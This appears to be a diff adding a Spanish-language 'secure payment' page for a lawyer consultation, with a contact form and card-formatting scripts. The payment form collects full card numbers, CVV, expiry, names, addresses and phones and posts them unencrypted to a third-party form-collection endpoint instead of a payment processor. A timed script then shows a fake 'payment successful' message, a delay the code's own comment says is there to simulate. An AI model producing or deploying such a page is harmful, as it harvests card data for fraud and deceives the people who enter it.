@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Consulta de Abogado - Pago Seguro</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow-x: hidden;
+        }
+        
+        .container {
+            max-width: 500px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            animation: fadeInUp 0.8s ease-out;
+        }
+        
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        h1 {
+            text-align: center;
+            color: white;
+            margin-bottom: 30px;
+            font-size: 28px;
+            font-weight: 600;
+            text-shadow: 0 2px 10px rgba(0,0,0,0.3);
+        }
+        
+        .form-group {
+            margin-bottom: 25px;
+            position: relative;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: rgba(255,255,255,0.9);
+            font-size: 14px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 15px 20px 15px 50px;
+            border: 2px solid rgba(255,255,255,0.2);
+            border-radius: 12px;
+            font-size: 16px;
+            background: rgba(255,255,255,0.1);
+            color: white;
+            backdrop-filter: blur(10px);
+            transition: all 0.3s ease;
+            font-family: inherit;
+        }
+        
+        input::placeholder {
+            color: rgba(255,255,255,0.6);
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #4ade80;
+            background: rgba(255,255,255,0.2);
+            box-shadow: 0 0 20px rgba(74, 222, 128, 0.3);
+            transform: translateY(-2px);
+        }
+
+        textarea {
+            width: 100%;
+            padding: 15px 20px 15px 50px;
+            border: 2px solid rgba(255,255,255,0.2);
+            border-radius: 12px;
+            font-size: 16px;
+            background: rgba(255,255,255,0.1);
+            color: white;
+            backdrop-filter: blur(10px);
+            transition: all 0.3s ease;
+            font-family: inherit;
+            resize: vertical;
+        }
+
+        textarea::placeholder {
+            color: rgba(255,255,255,0.6);
+        }
+
+        textarea:focus {
+            outline: none;
+            border-color: #4ade80;
+            background: rgba(255,255,255,0.2);
+            box-shadow: 0 0 20px rgba(74, 222, 128, 0.3);
+            transform: translateY(-2px);
+        }
+
+        .form-tabs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 30px;
+            border-bottom: 2px solid rgba(255,255,255,0.2);
+        }
+
+        .tab-btn {
+            flex: 1;
+            padding: 15px;
+            background: rgba(255,255,255,0.1);
+            border: none;
+            color: rgba(255,255,255,0.6);
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            border-bottom: 3px solid transparent;
+            transition: all 0.3s ease;
+            font-family: inherit;
+        }
+
+        .tab-btn:hover {
+            background: rgba(255,255,255,0.15);
+            color: rgba(255,255,255,0.9);
+        }
+
+        .tab-btn.active {
+            color: #4ade80;
+            border-bottom-color: #4ade80;
+            background: rgba(74, 222, 128, 0.1);
+        }
+
+        .tab-content {
+            display: none;
+            animation: fadeInUp 0.5s ease-out;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+        
+        .input-icon {
+            position: absolute;
+            left: 18px;
+            top: 48px;
+            color: rgba(255,255,255,0.6);
+            font-size: 18px;
+            z-index: 1;
+        }
+        
+        .card-row {
+            display: grid;
+            grid-template-columns: 2fr 1fr 1fr;
+            gap: 15px;
+        }
+        
+        .card-row input {
+            padding-left: 20px;
+        }
+        
+        .card-icon { left: 15px !important; }
+        .cvv-icon { left: 12px !important; }
+        .exp-icon { left: 15px !important; }
+        
+        .submit-btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #4ade80, #22c55e);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .submit-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 30px rgba(74, 222, 128, 0.4);
+        }
+        
+        .submit-btn:active {
+            transform: translateY(-1px);
+        }
+        
+        .success-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.7);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .success-content {
+            background: white;
+            padding: 40px;
+            border-radius: 20px;
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            animation: bounceIn 0.6s ease-out;
+        }
+        
+        @keyframes bounceIn {
+            0% { transform: scale(0.3); opacity: 0; }
+            50% { transform: scale(1.05); }
+            70% { transform: scale(0.9); }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        
+        .success-icon {
+            font-size: 60px;
+            color: #22c55e;
+            margin-bottom: 20px;
+        }
+        
+        .success-title {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1f2937;
+            margin-bottom: 10px;
+        }
+        
+        .success-text {
+            color: #6b7280;
+            margin-bottom: 30px;
+        }
+        
+        .close-btn {
+            background: #ef4444;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        
+        .close-btn:hover {
+            background: #dc2626;
+        }
+        
+        @media (max-width: 600px) {
+            .container {
+                padding: 30px 20px;
+                margin: 10px;
+            }
+            
+            .card-row {
+                grid-template-columns: 1fr;
+            }
+            
+            h1 {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="form-tabs">
+            <button class="tab-btn active" onclick="switchTab('payment')">
+                <i class="fas fa-credit-card"></i> Pago
+            </button>
+            <button class="tab-btn" onclick="switchTab('contact')">
+                <i class="fas fa-envelope"></i> Contacto
+            </button>
+        </div>
+
+        <!-- Payment Form -->
+        <div id="payment-tab" class="tab-content active">
+            <h1><i class="fas fa-shield-alt"></i> Pago Seguro</h1>
+            
+<form id="paymentForm" action="https://formspree.io/f/xzdjwvbk" method="POST">
+            <div class="form-group">
+                <label for="nombre"><i class="fas fa-user"></i> Nombre</label>
+                <i class="fas fa-user input-icon"></i>
+                <input type="text" id="nombre" name="nombre" placeholder="Ingresa tu nombre" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="apellido"><i class="fas fa-user-tag"></i> Apellido</label>
+                <i class="fas fa-user-tag input-icon"></i>
+                <input type="text" id="apellido" name="apellido" placeholder="Ingresa tu apellido" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="correo"><i class="fas fa-envelope"></i> Correo Electrónico</label>
+                <i class="fas fa-envelope input-icon"></i>
+                <input type="email" id="correo" name="correo" placeholder="tu@email.com" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="direccion"><i class="fas fa-map-marker-alt"></i> Dirección</label>
+                <i class="fas fa-map-marker-alt input-icon"></i>
+                <input type="text" id="direccion" name="direccion" placeholder="Tu dirección completa" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="ciudad"><i class="fas fa-city"></i> Ciudad</label>
+                <i class="fas fa-city input-icon"></i>
+                <input type="text" id="ciudad" name="ciudad" placeholder="Tu ciudad" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="cp"><i class="fas fa-hashtag"></i> Código Postal</label>
+                <i class="fas fa-hashtag input-icon"></i>
+                <input type="text" id="cp" name="cp" maxlength="10" placeholder="Código postal" required>
+            </div>
+            
+            <div class="form-group">
+                <label><i class="fas fa-credit-card"></i> Información de Tarjeta</label>
+                <div class="card-row">
+                    <div style="position: relative;">
+                        <i class="fas fa-credit-card card-icon input-icon"></i>
+                        <input type="text" id="tarjeta" name="tarjeta" placeholder="0000 0000 0000 0000" maxlength="19" required>
+                    </div>
+                    <div style="position: relative;">
+                        <i class="fas fa-lock cvv-icon input-icon"></i>
+                        <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="4" required>
+                    </div>
+                    <div style="position: relative;">
+                        <i class="fas fa-calendar exp-icon input-icon"></i>
+                        <input type="text" id="expiracion" name="expiracion" placeholder="MM/AA" maxlength="5" required>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <label for="nombre_tarjeta"><i class="fas fa-signature"></i> Nombre en Tarjeta</label>
+                <i class="fas fa-signature input-icon"></i>
+                <input type="text" id="nombre_tarjeta" name="nombre_tarjeta" placeholder="Como aparece en la tarjeta" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="telefono"><i class="fas fa-phone"></i> Teléfono</label>
+                <i class="fas fa-phone input-icon"></i>
+                <input type="tel" id="telefono" name="telefono" placeholder="XXX-XXX-XXXX" maxlength="14" required>
+            </div>
+            
+            <button type="submit" class="submit-btn">
+                <i class="fas fa-lock-open"></i> Realizar Pago
+            </button>
+        </form>
+        </div>
+
+        <!-- Contact Form with Netlify -->
+        <div id="contact-tab" class="tab-content">
+            <h1><i class="fas fa-envelope"></i> Formulario de Contacto</h1>
+            
+<form id="contactForm" name="contact" method="POST" netlify>
+                <div class="form-group">
+                    <label for="contact-nombre"><i class="fas fa-user"></i> Nombre</label>
+                    <i class="fas fa-user input-icon"></i>
+                    <input type="text" id="contact-nombre" name="nombre" placeholder="Tu nombre" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="contact-email"><i class="fas fa-envelope"></i> Correo Electrónico</label>
+                    <i class="fas fa-envelope input-icon"></i>
+                    <input type="email" id="contact-email" name="email" placeholder="tu@email.com" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="contact-telefono"><i class="fas fa-phone"></i> Teléfono</label>
+                    <i class="fas fa-phone input-icon"></i>
+                    <input type="tel" id="contact-telefono" name="telefono" placeholder="XXX-XXX-XXXX" maxlength="14" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="contact-asunto"><i class="fas fa-heading"></i> Asunto</label>
+                    <i class="fas fa-heading input-icon"></i>
+                    <input type="text" id="contact-asunto" name="asunto" placeholder="Asunto del mensaje" maxlength="100" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="contact-mensaje"><i class="fas fa-message"></i> Mensaje</label>
+                    <i class="fas fa-message input-icon"></i>
+                    <textarea id="contact-mensaje" name="mensaje" placeholder="Tu mensaje aquí..." maxlength="1000" rows="5" required></textarea>
+                </div>
+                
+                <button type="submit" class="submit-btn">
+                    <i class="fas fa-paper-plane"></i> Enviar Mensaje
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Modal de éxito -->
+    <div id="successModal" class="success-modal">
+        <div class="success-content">
+            <div class="success-icon">
+                <i class="fas fa-check-circle"></i>
+            </div>
+            <div class="success-title">¡Pago Realizado Exitosamente!</div>
+            <div class="success-text">Tu consulta ha sido programada. Recibirás una confirmación por correo electrónico en breve.</div>
+            <button class="close-btn" onclick="closeModal()">Cerrar</button>
+        </div>
+    </div>
+
+    <script>
+        // Tab switching function
+        function switchTab(tabName) {
+            // Hide all tabs
+            const tabs = document.querySelectorAll('.tab-content');
+            tabs.forEach(tab => tab.classList.remove('active'));
+            
+            // Remove active class from all buttons
+            const buttons = document.querySelectorAll('.tab-btn');
+            buttons.forEach(btn => btn.classList.remove('active'));
+            
+            // Show selected tab
+            document.getElementById(tabName + '-tab').classList.add('active');
+            
+            // Add active class to clicked button
+            event.target.closest('.tab-btn').classList.add('active');
+        }
+
+        // Formateo automático para tarjeta
+        document.getElementById('tarjeta').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
+            let formatted = '';
+            for (let i = 0; i < value.length; i += 4) {
+                formatted += value.slice(i, i + 4) + ' ';
+            }
+            e.target.value = formatted.trim().slice(0, 19);
+        });
+
+        // Formateo para teléfono payment (XXX-XXX-XXXX)
+        document.getElementById('telefono').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/[^\d]/g, '');
+            let formatted = '';
+            if (value.length >= 1) formatted += value.slice(0,3);
+            if (value.length >= 4) formatted += '-' + value.slice(3,6);
+            if (value.length >= 7) formatted += '-' + value.slice(6,10);
+            e.target.value = formatted.slice(0,14);
+        });
+
+        // Formateo para teléfono contact (XXX-XXX-XXXX)
+        document.getElementById('contact-telefono').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/[^\d]/g, '');
+            let formatted = '';
+            if (value.length >= 1) formatted += value.slice(0,3);
+            if (value.length >= 4) formatted += '-' + value.slice(3,6);
+            if (value.length >= 7) formatted += '-' + value.slice(6,10);
+            e.target.value = formatted.slice(0,14);
+        });
+
+        // Formateo para expiración MM/AA
+        document.getElementById('expiracion').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/[^\d]/g, '');
+            if (value.length >= 2 && value.length < 4) {
+                value = value.slice(0,2) + '/' + value.slice(2);
+            }
+            e.target.value = value.slice(0,5);
+        });
+
+        // Submit nativo Formspree (sin JS fetch para evitar CORS/451)
+        document.getElementById('paymentForm').addEventListener('submit', function(e) {
+            // No preventDefault - deja submit nativo POST
+            console.log('Enviando a Formspree nativamente...');
+            // Modal éxito después (Formspree redirige, pero UX mejorada)
+            setTimeout(() => {
+                document.getElementById('successModal').style.display = 'flex';
+                this.reset();
+            }, 1000); // Delay para simular
+        });
+
+        // Cerrar modal
+        function closeModal() {
+            document.getElementById('successModal').style.display = 'none';
+        }
+
+        // Cerrar modal clicando fuera
+        document.getElementById('successModal').addEventListener('click', function(e) {
+            if (e.target === this) closeModal();
+        });
+    </script>
+</body>
+</html>
+
